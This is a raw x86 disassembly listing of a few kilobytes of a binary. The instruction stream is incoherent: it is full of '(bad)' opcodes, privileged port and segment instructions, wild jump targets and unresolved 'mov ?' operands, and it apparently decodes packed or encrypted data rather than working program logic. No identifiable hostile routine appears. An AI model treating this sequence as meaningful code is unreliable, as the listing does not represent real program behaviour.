  42998a:	add    BYTE PTR [eax],al
  42998c:	push   0x1a
  42998e:	popa   
  42998f:	adc    bh,BYTE PTR [edi+0x3e206bc0]
  429995:	out    0xc6,eax
  429997:	sbb    ebx,edx
  429999:	cmp    al,0xd1
  42999b:	adc    DWORD PTR [ecx],edx
  42999d:	and    al,0xbc
  42999f:	xlat   BYTE PTR ds:[ebx]
  4299a0:	push   ds
  4299a1:	cmp    dl,ch
  4299a3:	aad    0xe6
  4299a5:	mov    ds,WORD PTR [ebp+0x4fcb177a]
  4299ab:	dec    esi
  4299ac:	mov    ebx,0xa33f8c3e
  4299b1:	in     eax,dx
  4299b2:	sub    cl,BYTE PTR fs:[edi+0x505cf295]
  4299b9:	nop
  4299ba:	xor    dh,BYTE PTR [ebx+ecx*8-0x7d74c945]
  4299c1:	test   al,0xf
  4299c3:	or     DWORD PTR [ecx+0x7],0xe3a5ca3
  4299ca:	dec    eax
  4299cb:	shl    BYTE PTR [eax],cl
  4299cd:	pop    edx
  4299ce:	clc    
  4299cf:	mov    ecx,0xfe311ee2
  4299d4:	loope  0x429a0e
  4299d6:	inc    ebp
  4299d7:	mov    ?,edx
  4299d9:	xchg   edi,eax
  4299da:	mov    DWORD PTR [ebx],eax
  4299dc:	mov    eax,ds:0x4f3e0a9
  4299e1:	cmp    BYTE PTR [ebx],bh
  4299e3:	pop    es
  4299e4:	xor    eax,0x7879f00e
  4299e9:	sub    ecx,DWORD PTR [edi-0x32d7465e]
  4299ef:	sbb    BYTE PTR [ebp+0x5095a2a9],0x27
  4299f6:	ins    DWORD PTR es:[edi],dx
  4299f7:	jl     0x4299d6
  4299f9:	lahf   
  4299fa:	xchg   ebp,eax
  4299fb:	push   es
  4299fc:	rcl    BYTE PTR [ecx-0x1907c2f4],cl
  429a02:	dec    ebp
  429a03:	jg     0x4299fa
  429a05:	pop    ds
  429a06:	addr16 in al,dx
  429a08:	dec    ebp
  429a09:	pop    esi
  429a0a:	popa   
  429a0b:	test   DWORD PTR [edx-0x9af2f98],0xd215cd32
  429a15:	cmp    al,0x77
  429a17:	lods   al,BYTE PTR gs:[esi]
  429a19:	sub    al,0xae
  429a1b:	in     al,dx
  429a1c:	rol    BYTE PTR [edx+ebx*1],0x89
  429a20:	fidivr WORD PTR [edx-0x45]
  429a23:	adc    BYTE PTR [edi+0x46],al
  429a26:	fcom   DWORD PTR [edx]
  429a28:	push   eax
  429a29:	pop    edx
  429a2a:	xchg   esp,eax
  429a2b:	retf   0x9c1b
  429a2e:	cmp    BYTE PTR [edi-0x1a704259],cl
  429a34:	push   ebx
  429a35:	enter  0x7aa9,0x4f
  429a39:	lods   al,BYTE PTR ds:[esi]
  429a3a:	mov    bl,0x88
  429a3c:	loopne 0x429a38
  429a3e:	test   eax,0x8078180f
  429a43:	add    bh,al
  429a45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a46:	jl     0xd3230959
  429a4c:	jmp    0x3af2d941
  429a51:	enter  0xb0b,0x26
  429a55:	jne    0x429a9f
  429a57:	jbe    0x429ac1
  429a59:	std    
  429a5a:	rol    DWORD PTR [ecx-0x66],cl
  429a5d:	outs   dx,DWORD PTR ds:[esi]
  429a5e:	(bad)  
  429a5f:	lock xor al,0x4f
  429a62:	mov    dl,0x98
  429a64:	push   0x7f
  429a66:	stos   BYTE PTR es:[edi],al
  429a67:	sub    eax,0x90052621
  429a6c:	scas   eax,DWORD PTR es:[edi]
  429a6d:	fnstenv [esi+eax*1]
  429a70:	stos   BYTE PTR es:[edi],al
  429a71:	repz imul ebp,DWORD PTR [ecx+edx*2-0x68],0x11
  429a77:	lock mov dl,0xd1
  429a7a:	adc    eax,0x97575ca7
  429a7f:	sub    DWORD PTR [edi-0x21],edi
  429a82:	(bad)  
  429a84:	pop    edx
  429a85:	push   0x5a
  429a87:	ins    DWORD PTR es:[edi],dx
  429a88:	add    esi,DWORD PTR ds:0x3b671dfe
  429a8e:	jb     0x429afb
	...
  429af4:	into   
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x3a95667
  429b01:	aad    0xc6
  429b03:	aam    0x7c
  429b05:	mov    ebp,0x1040001
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	das    
  429b0d:	loop   0x429aa5
  429b0f:	js     0x429b23
  429b11:	clc    
  429b12:	dec    cx
  429b14:	jae    0x429b30
  429b16:	shl    BYTE PTR ds:0xffe0a8ba,0x75
  429b1d:	xchg   edx,eax
  429b1e:	mov    ah,0xa8
  429b20:	and    DWORD PTR [eax],edx
  429b22:	mov    dh,0x8c
  429b24:	lods   eax,DWORD PTR ds:[esi]
  429b25:	mov    esi,?
  429b27:	ja     0x429b58
  429b29:	xchg   DWORD PTR [eax-0x6363057],eax
  429b2f:	or     BYTE PTR [ebx-0x5],bh
  429b32:	push   ecx
  429b33:	mov    DWORD PTR [ebp+0x5],ebp
  429b36:	pop    ds
  429b37:	imul   ebx,DWORD PTR [edx-0x76],0xf0bb1c05
  429b3e:	mov    edx,0xbdb95b40
  429b43:	jne    0x429b0b
  429b45:	cld    
  429b46:	push   edx
  429b47:	or     DWORD PTR [eiz*4+0x37cf852b],esi
  429b4e:	popf   
  429b4f:	stos   BYTE PTR es:[edi],al
  429b50:	or     ah,BYTE PTR [edi]
  429b52:	adc    bl,bl
  429b54:	ficom  WORD PTR [esp+ebp*4-0x326f1dc5]
  429b5b:	sbb    esi,edx
  429b5d:	push   edx
  429b5e:	daa    
  429b5f:	add    BYTE PTR [ebp+ebp*1-0x14f89959],cl
  429b66:	dec    edi
  429b67:	inc    ebp
  429b68:	sar    BYTE PTR [edx+0x60febe46],cl
  429b6e:	add    edx,DWORD PTR [ebx+0x1ccaa8b9]
  429b74:	jae    0x429bb4
  429b76:	ret    0xa1a8
  429b79:	test   eax,eax
  429b7b:	cmp    edx,eax
  429b7d:	push   esi
  429b7e:	pop    ebp
  429b7f:	adc    ah,BYTE PTR [edx-0x43]
  429b82:	push   esi
  429b83:	sbb    ch,BYTE PTR [esi]
  429b85:	repnz fldln2 
  429b88:	mov    BYTE PTR [eax+0x5e928556],ah
  429b8e:	mov    bh,0xea
  429b90:	(bad)  
  429b91:	jecxz  0x429b60
  429b93:	add    BYTE PTR [edx+ecx*4+0x31],bh
  429b97:	jno    0x429b82
  429b99:	lock es loopne 0x429bad
  429b9d:	out    dx,al
  429b9e:	bound  edx,QWORD PTR [eax+edx*4+0x4e]
  429ba2:	js     0x429b9b
  429ba4:	push   eax
  429ba5:	test   BYTE PTR ds:0xec94e2be,0xbd
  429bac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429bad:	retf   0x2544
  429bb0:	aad    0xaa
  429bb2:	fdiv   DWORD PTR ds:0x4c85bbb7
  429bb8:	fisubr DWORD PTR [ebp+0x3]
  429bbb:	mov    ds:0xbe600ce4,eax
  429bc0:	pop    ebp
  429bc1:	push   ss
  429bc2:	pop    es
  429bc3:	xchg   ebp,eax
  429bc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429bc5:	xchg   edx,eax
  429bc6:	es (bad) 
  429bc8:	add    DWORD PTR [eax-0x7d4b8cd7],ecx
  429bce:	cmc    
  429bcf:	call   0xf46c071
  429bd4:	int    0x52
  429bd6:	call   edi
  429bd8:	sub    al,0x37
  429bda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429bdb:	inc    ebx
  429bdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429bdd:	sub    BYTE PTR ds:0x41292a45,al
  429be3:	outs   dx,BYTE PTR ds:[esi]
  429be4:	or     DWORD PTR [ebx-0x7cd157dc],edx
  429bea:	xor    ebp,DWORD PTR [edx]
  429bec:	inc    ebp
  429bed:	jmp    0x429c34
  429bef:	div    esi
  429bf1:	pop    edx
  429bf2:	je     0x429bb7
  429bf4:	retf   
  429bf5:	lea    ebx,[ecx+0x3e]
  429bf8:	mov    ecx,0x7634b9d7
  429bfd:	or     BYTE PTR [esi+0x52],ch
  429c00:	cmp    DWORD PTR [eax],edx
  429c02:	fdiv   DWORD PTR fs:[edx]
  429c05:	data16 add al,BYTE PTR [ecx+0x6e]
  429c09:	mov    edx,ecx
  429c0b:	ds dec ebp
  429c0d:	push   esi
  429c0e:	sbb    ebx,DWORD PTR [ebp+0x0]
	...
  429c71:	add    BYTE PTR [eax],al
  429c73:	add    BYTE PTR [ebx-0x487759ea],ah
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [esi-0x7f6692a7],bh
  429c85:	mov    esi,0x1040001
  429c8a:	add    BYTE PTR [eax],al
  429c8c:	and    eax,DWORD PTR [eax]
  429c8e:	pop    ebp
  429c8f:	xor    DWORD PTR [ecx+0x48],0xffffffdf
  429c93:	lea    ecx,[edx-0x33]
  429c96:	jns    0x429c58
  429c98:	sbb    BYTE PTR [edi-0x36f0b019],cl
  429c9e:	sub    eax,0xcee32e05
  429ca3:	pop    ebp
  429ca4:	xchg   ebx,eax
  429ca5:	push   edx
  429ca6:	xchg   esp,eax
  429ca7:	sub    bh,dh
  429ca9:	loope  0x429d04
  429cab:	dec    esp
  429cac:	sub    al,0xec
  429cae:	mov    ecx,0x4f1cd64e
  429cb3:	adc    al,0xe8
  429cb5:	out    0x77,eax
  429cb7:	dec    esp
  429cb8:	and    BYTE PTR [ebx-0x51],al
  429cbb:	test   edx,esp
  429cbd:	fsincos 
  429cbf:	xchg   DWORD PTR [esi+0x7188ea6e],edx
  429cc5:	xchg   ecx,eax
  429cc6:	xchg   edx,eax
  429cc7:	sahf   
  429cc8:	hlt    
  429cc9:	int    0x0
  429ccb:	idiv   DWORD PTR [edx+ebx*1+0x629a430]
  429cd2:	jnp    0x429d4a
  429cd4:	mov    bh,0x17
  429cd6:	pop    eax
  429cd7:	pop    esi
  429cd8:	enter  0x8376,0x45
  429cdc:	and    DWORD PTR [edi],eax
  429cde:	enter  0x7ffd,0x5a
  429ce2:	(bad)  
  429ce3:	js     0x429d07
  429ce5:	push   edx
  429ce6:	mov    ds:0xd01614cb,al
  429ceb:	loop   0x429d5b
  429ced:	mov    ebp,0xd8283c99
  429cf2:	test   al,0xa0
  429cf4:	ins    BYTE PTR es:[edi],dx
  429cf5:	sbb    DWORD PTR ds:0x6ca55f64,edx
  429cfb:	iret   
  429cfc:	in     eax,0xcb
  429cfe:	sbb    eax,0xcd6a9606
  429d03:	not    DWORD PTR [eax]
  429d05:	js     0x429d37
  429d07:	add    edi,DWORD PTR [esi+esi*8+0x26]
  429d0b:	mov    edi,0xa570b35
  429d10:	xor    ebp,DWORD PTR [edi+eiz*8+0x74]
  429d14:	adc    DWORD PTR [ecx+0x42],eax
  429d17:	sahf   
  429d18:	retf   0xe15d
  429d1b:	(bad)  
  429d1c:	(bad)  
  429d1d:	dec    edx
  429d1e:	es retf 0xf7f4
  429d22:	rcr    dl,0xfb
  429d25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d26:	push   ebx
  429d27:	fsubr  DWORD PTR [ebx-0x4d01c93e]
  429d2d:	js     0x429d3f
  429d2f:	xor    BYTE PTR [eax+esi*1+0x6ca02a12],0xed
  429d37:	or     DWORD PTR [edx-0x4a68431d],0x520e208d
  429d41:	mov    ch,0x95
  429d43:	(bad)  
  429d45:	(bad)  
  429d46:	dec    ebx
  429d47:	int3   
  429d48:	sub    ecx,DWORD PTR [eax-0x18]
  429d4b:	cli    
  429d4c:	imul   ebp,DWORD PTR [ecx],0x36
  429d4f:	and    eax,0x6abdff37
  429d54:	mov    ds:0xf71958e6,al
  429d59:	inc    eax
  429d5a:	popf   
  429d5b:	or     DWORD PTR [ecx+0x151752f1],ecx
  429d61:	aam    0x5e
  429d63:	mov    ch,0x61
  429d65:	stc    
  429d66:	sub    al,0x9f
  429d68:	ja     0x429d3c
  429d6a:	les    ecx,FWORD PTR [edi+0x54]
  429d6d:	mov    ch,0xb6
  429d6f:	dec    ecx
  429d70:	add    ebx,DWORD PTR [ebp+0x13]
  429d73:	adc    ah,BYTE PTR [ecx+eax*1+0x41]
  429d77:	ret    0x5c29
  429d7a:	push   esi
  429d7b:	xlat   BYTE PTR ds:[ebx]
  429d7c:	ret    
  429d7d:	repz sbb dl,BYTE PTR [esi]
  429d80:	(bad)  
  429d81:	fdiv   QWORD PTR [ecx]
  429d83:	fmul   QWORD PTR [ebx+0x68]
  429d86:	test   DWORD PTR [edx-0xd],ecx
  429d89:	add    esp,DWORD PTR [edx+0x66dd0301]
  429d8f:	push   edx
	...
  429df4:	fwait
  429df5:	mov    bh,0xc4
  429df7:	or     al,0xec
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	sar    dl,0x27
  429e03:	add    BYTE PTR [edi+edi*4+0x1040001],al
  429e0a:	add    BYTE PTR [eax],al
  429e0c:	cmp    ebp,DWORD PTR [ecx+0x719c8c79]
  429e12:	fnstcw WORD PTR [ecx-0x69]
  429e15:	jmp    0x429dfa
  429e17:	addr16 push 0xc27b37b2
  429e1d:	push   esi
  429e1e:	pop    ebx
  429e1f:	push   0xf522727f
  429e24:	jle    0x429e21
  429e26:	mov    ah,0xeb
  429e28:	lock jle 0x429ddb
  429e2b:	into   
  429e2c:	ja     0x429e71
  429e2e:	loope  0x429e01
  429e30:	mov    eax,ds:0x244a5857
  429e35:	gs inc esp
  429e37:	push   ebp
  429e38:	push   ss
  429e39:	push   esp
  429e3a:	es inc esi
  429e3c:	inc    edx
  429e3d:	pop    esi
  429e3e:	and    eax,0x16ebe161
  429e43:	aas    
  429e44:	mov    al,ds:0xc9dd5e64
  429e49:	xchg   esp,eax
  429e4a:	icebp  
  429e4b:	arpl   WORD PTR [ebp-0x50],bx
  429e4e:	xor    DWORD PTR [ecx-0x14],eax
  429e51:	mov    DWORD PTR [edx+0x7f],esi
  429e54:	dec    ebp
  429e55:	popa   
  429e56:	inc    esi
  429e57:	fnstsw WORD PTR [edi+0x25]
  429e5a:	fild   WORD PTR ds:0xd2baf97c
  429e60:	ins    BYTE PTR es:[edi],dx
  429e61:	xchg   esi,eax
  429e62:	fisttp DWORD PTR [ebx]
  429e64:	adc    ebx,DWORD PTR [ecx+0x2d]
  429e67:	add    eax,0x3ff8a63d
  429e6c:	nop
  429e6d:	and    BYTE PTR [ecx],ch
  429e6f:	popf   
  429e70:	test   eax,0xffa8fb7
  429e75:	xchg   BYTE PTR [ebx],dh
  429e77:	pushf  
  429e78:	adc    eax,0xc1cc46ee
  429e7d:	mov    ebx,0x6daef701
  429e82:	lock and ebx,DWORD PTR es:[edi-0x2f]
  429e87:	ds out 0xde,eax
  429e8a:	pop    esi
  429e8b:	leave  
  429e8c:	xchg   ecx,eax
  429e8d:	mov    bl,BYTE PTR [edx-0x41]
  429e90:	sbb    al,0x9e
  429e92:	bswap  edi
  429e94:	leave  
  429e95:	cli    
  429e96:	sbb    ebp,DWORD PTR [ebp*2-0x1b85a562]
  429e9d:	stos   BYTE PTR es:[edi],al
  429e9e:	add    DWORD PTR [eax-0x4b],0x41bb66f1
  429ea5:	mov    ds:0xf550feb7,eax
  429eaa:	mov    eax,DWORD PTR [eax+ebp*2-0x272ff86a]
  429eb1:	outs   dx,DWORD PTR ds:[esi]
  429eb2:	aam    0x91
  429eb4:	mov    edi,0x29e30e9e
  429eb9:	sub    al,0xe2
  429ebb:	shl    eax,cl
  429ebd:	mov    esi,0x6fa7032b
  429ec2:	add    ah,al
  429ec4:	and    DWORD PTR [esi],esp
  429ec6:	clc    
  429ec7:	ja     0x429ead
  429ec9:	dec    ebx
  429eca:	inc    eax
  429ecb:	mov    dl,0xac
  429ecd:	stos   DWORD PTR es:[edi],eax
  429ece:	push   cs
  429ecf:	mov    al,BYTE PTR [ebp+0x9947d0]
  429ed5:	add    edx,DWORD PTR [esi-0x52]
  429ed8:	mov    cl,0x7f
  429eda:	jnp    0x429f0e
  429edc:	inc    ebx
  429edd:	push   0xc3943a3f
  429ee2:	jne    0x429ee7
  429ee4:	or     ebp,ebp
  429ee6:	dec    ebp
  429ee7:	inc    edx
  429ee8:	adc    dl,BYTE PTR [eax+0x7a6c3cd2]
  429eee:	add    esp,DWORD PTR [ecx-0x4f72ea1e]
  429ef4:	pop    esi
  429ef5:	xchg   BYTE PTR [eax+0x20e5f38b],dl
  429efb:	clc    
  429efc:	(bad)  
  429efd:	mov    ds:0x223c0317,al
  429f02:	fcmovnu st,st(2)
  429f04:	jno    0x429ea1
  429f06:	push   eax
  429f07:	and    ah,BYTE PTR [ebp-0x1c2ea119]
  429f0d:	sub    al,0xe9
  429f0f:	inc    esp
	...
  429f74:	xor    DWORD PTR [ebp-0x38],eax
  429f77:	push   es
  429f78:	cld    
  429f79:	(bad)  
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx+0x96e8cf]
  429f84:	mov    al,al
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    al,0x1
  429f8a:	add    BYTE PTR [eax],al
  429f8c:	jnp    0x429f57
  429f8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429f8f:	lds    esi,FWORD PTR ds:0xc13f38d0
  429f95:	div    BYTE PTR [edi-0x36]
  429f98:	ja     0x42a013
  429f9a:	jecxz  0x429f60
  429f9c:	cmp    eax,esi
  429f9e:	jns    0x429f96
  429fa0:	ficomp DWORD PTR [ecx-0x6e]
  429fa3:	mov    bl,0xcc
  429fa5:	mov    al,0x7
  429fa7:	mov    dh,0xc2
  429fa9:	xor    eax,ebp
  429fab:	jo     0x429ffd
  429fad:	sub    eax,0xf4187dc2
  429fb2:	jmp    0x429fde
  429fb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429fb5:	fs mov ah,0x23
  429fb8:	rcl    BYTE PTR [edx],cl
  429fba:	scas   eax,DWORD PTR es:[edi]
  429fbb:	inc    edx
  429fbc:	add    dh,BYTE PTR [edx-0x27e24a88]
  429fc2:	loopne 0x429f6a
  429fc4:	arpl   WORD PTR [ecx+edx*2-0x5307d78b],sp
  429fcb:	das    
  429fcc:	mov    esi,0xba81091
  429fd1:	add    BYTE PTR [ecx+0x20102ce1],ch
  429fd7:	sbb    DWORD PTR [edi+0xc1db6cb],edx
  429fdd:	mov    ecx,0xd8bed17f
  429fe2:	mov    ch,0xe2
  429fe4:	int3   
  429fe5:	mov    esi,0x1af5faaf
  429fea:	test   DWORD PTR [esi+0x52],edi
  429fed:	pop    es
  429fee:	loopne 0x429fdd
  429ff0:	test   al,0x58
  429ff2:	mov    bl,0xa6
  429ff4:	mov    esp,0x90122519
  429ff9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ffa:	out    dx,eax
  429ffb:	adc    al,0xd7
  429ffd:	jecxz  0x429f7f
  429fff:	jmp    0x425164d0
  42a004:	push   es
  42a005:	push   0xf7453abd
  42a00a:	mov    esi,0x5f9ec6c5
  42a00f:	stc    
  42a010:	mov    dh,0xc5
  42a012:	lds    esi,FWORD PTR [esi]
  42a014:	mov    al,0x2b
  42a016:	icebp  
  42a017:	and    eax,0x4ae79e24
  42a01c:	jmp    0x42a067
  42a01e:	push   ebx
  42a01f:	add    edi,edi
  42a021:	test   DWORD PTR [ecx+ebx*4-0x6c],0xd5a99008
  42a029:	push   esi
  42a02a:	mov    eax,0x85cefe86
  42a02f:	outs   dx,DWORD PTR ds:[esi]
  42a030:	mov    esp,0x7b2ae3d2
  42a035:	int    0x73
  42a037:	popf   
  42a038:	pop    esp
  42a039:	fs jp  0x429fcd
  42a03c:	out    dx,al
  42a03d:	mov    ebx,0x8e6d47a8
  42a042:	add    BYTE PTR [edx+0x22f66310],bl
  42a048:	adc    bh,BYTE PTR [ecx+0x4]
  42a04b:	je     0x42a04a
  42a04d:	rol    DWORD PTR [edi-0x76],cl
  42a050:	adc    BYTE PTR [edi],dh
  42a052:	mov    al,0x0
  42a054:	inc    ebp
  42a055:	push   0xffffffd5
  42a057:	out    dx,al
  42a058:	mov    dl,0xa
  42a05a:	sub    eax,0xdf2a4f88
  42a05f:	dec    ebp
  42a060:	imul   esp,DWORD PTR [ebx],0x7590967a
  42a066:	push   es
  42a067:	rcr    DWORD PTR [ebx-0x4a],1
  42a06a:	xor    BYTE PTR [eax+0x488ca3a8],ah
  42a070:	adc    eax,0x46b4f7ce
  42a075:	rcl    BYTE PTR [esi],1
  42a077:	fdiv   st(7),st
  42a079:	add    eax,0xb0a52cd4
  42a07e:	fmul   QWORD PTR [edi]
  42a080:	pushf  
  42a081:	xchg   DWORD PTR [ebp+0x2e],eax
  42a084:	jno    0x42a0a9
  42a086:	or     BYTE PTR [ebx],dl
  42a088:	push   ds
  42a089:	pop    ebx
  42a08a:	int    0xa8
  42a08c:	cwde   
  42a08d:	pop    esp
  42a08e:	and    ebx,DWORD PTR [esi+0x0]
	...
  42a0f4:	xlat   BYTE PTR ds:[ebx]
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	rcr    ebx,1
  42a102:	dec    esp
  42a103:	xchg   edx,eax
  42a104:	mov    ecx,es
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    al,0x1
  42a10a:	add    BYTE PTR [eax],al
  42a10c:	stc    
  42a10d:	adc    al,0x9b
  42a10f:	push   0x9abeb74d
  42a114:	sbb    BYTE PTR ds:0x17ea9f5e,0x63
  42a11b:	jg     0x42a11b
  42a11d:	mov    ebp,eax
  42a11f:	repz sbb DWORD PTR ds:0x2ad7bd3c,ebp
  42a126:	dec    edi
  42a127:	mov    ecx,0x415c9481
  42a12c:	mov    ecx,0xc8279373
  42a131:	sub    DWORD PTR [ecx-0x61],ecx
  42a134:	div    DWORD PTR [ecx+0x33]
  42a137:	push   ss
  42a138:	mov    dl,0x67
  42a13a:	sbb    DWORD PTR [esi-0x42],esp
  42a13d:	arpl   di,di
  42a13f:	and    bl,BYTE PTR [ecx+0x71]
  42a142:	sahf   
  42a143:	and    ch,BYTE PTR [edx-0x550f2051]
  42a149:	mov    ch,bh
  42a14b:	or     DWORD PTR [ebp+ebp*8-0x232f3eaa],ebx
  42a152:	push   cs
  42a153:	sti    
  42a154:	js     0x42a109
  42a156:	aaa    
  42a157:	dec    ecx
  42a158:	mov    edi,0x77ffe68b
  42a15d:	ins    DWORD PTR es:[edi],dx
  42a15e:	shl    BYTE PTR ds:0x49caf861,1
  42a164:	xchg   esp,eax
  42a165:	mov    dl,0x18
  42a167:	mov    cl,0x6
  42a169:	(bad)  
  42a16a:	imul   ebx,DWORD PTR [edi+edi*8+0xaa27672],0xeec48500
  42a175:	push   edx
  42a176:	push   cs
  42a177:	psubusw mm7,QWORD PTR [edi+0x4c]
  42a17b:	int    0x47
  42a17d:	mov    DWORD PTR [edx+eiz*1+0xa58031f],ebx
  42a184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a185:	in     eax,dx
  42a186:	cwde   
  42a187:	jge    0x42a138
  42a189:	xor    al,0x60
  42a18b:	push   es
  42a18c:	lds    eax,FWORD PTR [edi]
  42a18e:	mov    eax,0x5006df74
  42a193:	aam    0x22
  42a195:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a196:	(bad)  
  42a197:	lods   al,BYTE PTR ds:[esi]
  42a198:	out    0x4a,al
  42a19a:	xchg   ebx,eax
  42a19b:	jle    0x42a207
  42a19d:	(bad)  
  42a19e:	(bad)  
  42a19f:	mov    ecx,0x8edaa8fd
  42a1a4:	ret    
  42a1a5:	sub    DWORD PTR [ecx+0x40],0x915111f3
  42a1ac:	mov    esi,0x609b2281
  42a1b1:	and    DWORD PTR [edx-0x79722eda],0x9564633e
  42a1bb:	sahf   
  42a1bc:	and    DWORD PTR [ecx-0x45],ecx
  42a1bf:	mov    ds:0x147376b9,al
  42a1c4:	jge    0x42a1e7
  42a1c6:	mov    eax,0x2b1a061d
  42a1cb:	imul   ebx,edi,0xffffffff
  42a1ce:	repnz pop ss
  42a1d0:	or     al,0xce
  42a1d2:	sub    edx,ebp
  42a1d4:	dec    ebp
  42a1d5:	or     BYTE PTR [esi+0x1b00d470],cl
  42a1db:	loope  0x42a205
  42a1dd:	mov    ds:0x1c2af330,eax
  42a1e2:	out    0x26,eax
  42a1e4:	jmp    0xafd8daa4
  42a1e9:	add    cl,BYTE PTR [ebp+edx*1+0x72]
  42a1ed:	mov    ebp,0xe6f8b464
  42a1f2:	mov    gs,edi
  42a1f4:	xchg   ecx,eax
  42a1f5:	nop
  42a1f6:	xor    eax,0xa6df3c7b
  42a1fb:	cmp    eax,0xdfb248dc
  42a200:	pushf  
  42a201:	jl     0x42a217
  42a203:	std    
  42a204:	mov    al,BYTE PTR ds:0x18eb10b
  42a20a:	daa    
  42a20b:	push   esp
  42a20c:	popf   
  42a20d:	mov    ds:0x6a0b,eax
	...
  42a272:	add    BYTE PTR [eax],al
  42a274:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42a27a:	scas   eax,DWORD PTR es:[edi]
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fnstcw WORD PTR [ebx-0x6f2c6d04]
  42a285:	ret    0x1
  42a288:	add    al,0x1
  42a28a:	add    BYTE PTR [eax],al
  42a28c:	ins    BYTE PTR es:[edi],dx
  42a28d:	xor    dh,dl
  42a28f:	sub    BYTE PTR [edx-0x2c],ch
  42a292:	push   eax
  42a293:	hlt    
  42a294:	mov    bl,0xd0
  42a296:	mov    dl,0x7f
  42a298:	popf   
  42a299:	add    DWORD PTR ds:0x91ec563b,eax
  42a29f:	in     al,0xeb
  42a2a1:	xchg   ebx,eax
  42a2a2:	fs inc ebx
  42a2a4:	and    eax,0xfc15c8ea
  42a2a9:	jmp    0x10c1:0x8cb38d04
  42a2b0:	in     al,dx
  42a2b1:	sar    ebp,1
  42a2b3:	int    0xee
  42a2b5:	scas   eax,DWORD PTR es:[edi]
  42a2b6:	loope  0x42a259
  42a2b8:	das    
  42a2b9:	scas   eax,DWORD PTR es:[edi]
  42a2ba:	(bad)  
  42a2bb:	cmp    BYTE PTR [eax+0x77],dh
  42a2be:	es sbb BYTE PTR ds:[eax],0x78
  42a2c3:	push   edx
  42a2c4:	cmp    eax,0x17c079b9
  42a2c9:	jns    0x42a338
  42a2cb:	ret    0xb209
  42a2ce:	pop    edi
  42a2cf:	gs jp  0x42a33a
  42a2d2:	sbb    al,ch
  42a2d4:	add    BYTE PTR [ebp-0x75641943],al
  42a2da:	out    dx,eax
  42a2db:	jp     0x42a342
  42a2dd:	mov    BYTE PTR ds:0x9c802026,0x14
  42a2e4:	push   ds
  42a2e5:	dec    esp
  42a2e6:	and    dh,BYTE PTR [eax-0x1e2c92f8]
  42a2ec:	adc    BYTE PTR [esi+0x4f9dc29c],dl
  42a2f2:	sbb    ebp,esi
  42a2f4:	adc    al,0xd0
  42a2f6:	and    al,0xed
  42a2f8:	hlt    
  42a2f9:	mov    ds:0x208be230,eax
  42a2fe:	jl     0x42a299
  42a300:	repz push eax
  42a302:	mov    ebx,0x1aade46e
  42a307:	call   0x18fbd6b4
  42a30c:	cmc    
  42a30d:	mov    edx,ebx
  42a30f:	in     al,0x50
  42a311:	mov    ebx,0x28b76071
  42a316:	mov    cl,0xbe
  42a318:	jmp    0x42a2ad
  42a31a:	push   ebp
  42a31b:	push   0x6cf486a7
  42a320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a321:	aas    
  42a322:	pop    esp
  42a323:	pop    ebx
  42a324:	pop    esi
  42a325:	or     BYTE PTR [esi+edi*4+0x30b376d],0x38
  42a32d:	stc    
  42a32e:	mov    edi,0x34bedadc
  42a333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a334:	pop    eax
  42a335:	pop    ebp
  42a336:	xor    DWORD PTR [esi+0x31],edi
  42a339:	sar    BYTE PTR ds:0xbb8b0e5e,1
  42a33f:	push   cs
  42a340:	xor    BYTE PTR [ebx-0x128a26e4],0xf1
  42a347:	imul   edi,ebp,0x83adb169
  42a34d:	mov    bl,0xb6
  42a34f:	sbb    eax,0x2bc81615
  42a354:	xlat   BYTE PTR ds:[ebx]
  42a355:	push   ss
  42a356:	sub    al,0x8
  42a358:	and    ch,BYTE PTR [ecx-0x54]
  42a35b:	xchg   edi,eax
  42a35c:	cs inc edi
  42a35e:	push   eax
  42a35f:	dec    ecx
  42a360:	clc    
  42a361:	pop    ecx
  42a362:	mov    ch,0x91
  42a364:	pop    ds
  42a365:	sti    
  42a366:	push   0x658028c7
  42a36b:	jg     0x42a377
  42a36d:	and    eax,0x9a578a7f
  42a372:	or     eax,0x713a0a42
  42a377:	jbe    0x42a33d
  42a379:	or     eax,0xf5eee4da
  42a37e:	nop
  42a37f:	dec    ecx
  42a380:	bound  esp,QWORD PTR [edi-0x3c3481a7]
  42a386:	enter  0xec5a,0xf5
  42a38a:	aad    0xe0
  42a38c:	mov    edi,edi
  42a38e:	push   es
  42a38f:	sbb    al,BYTE PTR [eax]
	...
  42a3f1:	add    BYTE PTR [eax],al
  42a3f3:	add    BYTE PTR [edi+0xe],bh
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x9a91cc3d
  42a403:	or     DWORD PTR [ebx+eax*8+0x1040001],edx
  42a40a:	add    BYTE PTR [eax],al
  42a40c:	mov    al,0x98
